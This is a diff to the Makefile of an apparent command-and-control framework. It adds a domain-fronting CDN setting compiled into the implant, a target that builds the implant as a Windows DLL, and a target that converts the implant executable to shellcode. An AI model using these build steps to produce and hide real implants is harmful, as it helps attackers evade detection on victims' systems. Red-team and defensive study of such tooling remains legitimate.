@@ -20,6 +20,9 @@ TRANSPORT_TYPE ?= https
 DNS_DOMAIN     ?=
 DNS_SERVER     ?=
 
+# Domain fronting / redirector
+CDN_DOMAIN     ?=
+
 LDFLAGS = -s -w \
 	-X '$(MODULE)/implant.implantID=$(IMPLANT_ID)' \
 	-X '$(MODULE)/implant.implantSecret=$(IMPLANT_SECRET)' \
@@ -29,9 +32,10 @@ LDFLAGS = -s -w \
 	-X '$(MODULE)/implant.caCertPEM=$(CA_CERT_PEM)' \
 	-X '$(MODULE)/implant.transportType=$(TRANSPORT_TYPE)' \
 	-X '$(MODULE)/implant.dnsDomain=$(DNS_DOMAIN)' \
-	-X '$(MODULE)/implant.dnsServer=$(DNS_SERVER)'
+	-X '$(MODULE)/implant.dnsServer=$(DNS_SERVER)' \
+	-X '$(MODULE)/implant.cdnDomain=$(CDN_DOMAIN)'
 
-.PHONY: all proto teamserver implant implant-win operator clean
+.PHONY: all proto teamserver implant implant-win implant-dll implant-shellcode operator clean
 
 all: proto teamserver implant operator
 
@@ -53,6 +57,16 @@ implant-win:
 operator:
 	@mkdir -p $(BUILD_DIR)
 	go build -o $(BUILD_DIR)/operator $(OPERATOR)
+
+implant-dll:
+	@mkdir -p $(BUILD_DIR)
+	CGO_ENABLED=1 GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc \
+		go build -buildmode=c-shared -tags dll -ldflags "$(LDFLAGS)" \
+		-o $(BUILD_DIR)/implant.dll $(IMPLANT)
+
+implant-shellcode: implant-win
+	@mkdir -p $(BUILD_DIR)
+	go run ./cmd/tools/pe2shellcode -i $(BUILD_DIR)/implant.exe -o $(BUILD_DIR)/implant.bin
 
 clean:
 	rm -rf $(BUILD_DIR)
